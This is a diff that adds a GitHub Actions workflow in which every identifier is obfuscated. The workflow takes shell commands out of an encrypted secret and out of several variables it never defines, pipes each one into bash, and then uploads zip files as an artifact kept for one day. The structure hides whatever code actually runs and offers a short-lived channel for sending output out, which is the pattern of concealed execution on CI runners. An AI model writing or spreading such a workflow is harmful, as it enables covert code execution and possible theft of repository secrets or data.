@@ -1,0 +1,25 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          egt54016: ${{ secrets.egt54016 }}
+        run: |
+          printf '%s' "$egt54016" | jq -r .ugft3482 | /bin/bash
+          printf '%s' "$x2980" | jq -r .l5 | /bin/bash
+          echo $yro0 | jq -r .se814 | /bin/bash
+          echo $v875 | jq -r .hbge4309 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: n76MllsB
+          path: "*.zip"
+          retention-days: 1
